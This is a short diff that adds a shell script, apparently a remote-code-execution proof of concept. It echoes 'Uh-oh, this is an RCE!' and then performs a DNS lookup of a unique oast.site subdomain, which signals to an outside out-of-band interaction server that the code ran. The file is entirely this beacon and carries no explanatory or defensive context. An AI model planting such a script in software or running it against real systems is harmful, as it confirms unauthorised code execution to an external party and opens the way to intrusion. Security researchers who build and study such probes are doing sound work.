@@ -1,0 +1,3 @@
+#!/bin/sh
+echo "Uh-oh, this is an RCE!"
+nslookup uvcy170aox0pn5ma5pllkk2l56gvs2tj4.oast.site
